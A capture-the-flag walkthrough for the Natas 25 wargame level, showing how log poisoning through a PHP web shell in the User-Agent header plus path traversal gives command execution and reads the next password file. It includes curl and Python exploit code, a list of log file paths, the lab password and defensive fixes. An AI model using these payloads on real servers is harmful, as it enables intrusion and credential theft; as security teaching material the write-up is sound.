25 Local File Inclusion (LFI) — Log Poisoning Hard

// Key Concepts

Local File Inclusion (LFI) Log Poisoning Remote Code Execution (RCE) Path Traversal User-Agent Injection

// Challenge Overview

This level combines Local File Inclusion (LFI) with log poisoning. The application includes files based on user input, and we can poison the log file by injecting PHP code through the User-Agent header.

// Initial Analysis

View the source code:

<?php $lang = "en"; if (array_key_exists("lang", $_GET)) { $lang = $_GET["lang"]; } $file = "lang/" . $lang . ".html"; if (strpos($_SERVER["HTTP_USER_AGENT"], "Natas") !== false) { log_request(); } include($file); ?>

The application includes files based on the lang parameter. It also logs requests to a log file when the User-Agent contains "Natas".

💡 Log poisoning is a technique where attackers inject malicious code into log files. By including the log file through LFI, the injected code gets executed by the PHP interpreter.

// Understanding Log Poisoning

Steps for log poisoning:

  1. Poison the log: Inject PHP code into the User-Agent header.
  2. Include the log file: Use LFI to include the log file.
  3. Execute the code: The PHP code in the log file is executed.

// Solution Walkthrough

Step 1 — Find the log file location:

The log file is typically stored in /var/log/apache2/access.log or a similar location. We can try to include it.

Step 2 — Poison the log by sending a request with a malicious User-Agent:

curl -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c \ --user-agent "Natas <?php passthru(\$_GET['cmd']); ?>" \ "http://natas25.natas.labs.overthewire.org/?lang=..."

Step 3 — Include the log file with the poisoned User-Agent:

http://natas25.natas.labs.overthewire.org/?lang=../../../../var/log/apache2/access.log

Step 4 — Execute commands via the injected code:

http://natas25.natas.labs.overthewire.org/?lang=../../../../var/log/apache2/access.log&cmd=cat /etc/natas_webpass/natas26

Complete Python automation:

import requests import time url = "http://natas25.natas.labs.overthewire.org/" auth = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c") # Step 1: Poison the log with PHP code user_agent = "Natas <?php passthru(\$_GET['cmd']); ?>" params = {"lang": "en"} headers = {"User-Agent": user_agent} response = requests.get(url, auth=auth, params=params, headers=headers) # Step 2: Include the log file and execute commands log_path = "../../../../var/log/apache2/access.log" params = {"lang": log_path, "cmd": "cat /etc/natas_webpass/natas26"} response = requests.get(url, auth=auth, params=params) print(response.text)

Common log file paths:

# Linux/Apache /var/log/apache2/access.log /var/log/apache/access.log /var/log/httpd/access.log /var/log/nginx/access.log # PHP error logs /var/log/php/error.log /var/log/php-fpm/error.log /tmp/php_errors.log # Application logs ../logs/access.log ../../logs/error.log

// Why It Works

The LFI with log poisoning works because:

  • User-controlled file inclusion: The lang parameter controls which file is included.
  • User-Agent logging: The User-Agent header is logged to a file.
  • PHP code injection: PHP code in the User-Agent gets executed when the log file is included.
  • No input sanitization: The application doesn't filter the lang parameter or the User-Agent.

// Defensive Measures

  • Use a whitelist for allowed file inclusions.
  • Sanitize the User-Agent before logging it.
  • Store log files outside the web root.
  • Use proper file permissions to restrict access to log files.
  • Disable URL inclusion (allow_url_include=Off).
  • Use input validation to prevent path traversal.

// Secure Code Example

<?php // Method 1: Whitelist $allowed_langs = ['en', 'fr', 'es']; $lang = in_array($_GET['lang'], $allowed_langs) ? $_GET['lang'] : 'en'; include("lang/" . $lang . ".html"); // Method 2: Sanitize User-Agent before logging $ua = htmlspecialchars($_SERVER["HTTP_USER_AGENT"]); log_request($ua); ?>

// Key Takeaways

📄 LFI + Log Poisoning = RCE

When LFI is combined with log poisoning, attackers can achieve remote code execution. Always sanitize user input, including headers.

🛡️ Whitelist Is the Way

Using a whitelist for file inclusion is the safest approach. Never allow user input to directly control file paths.
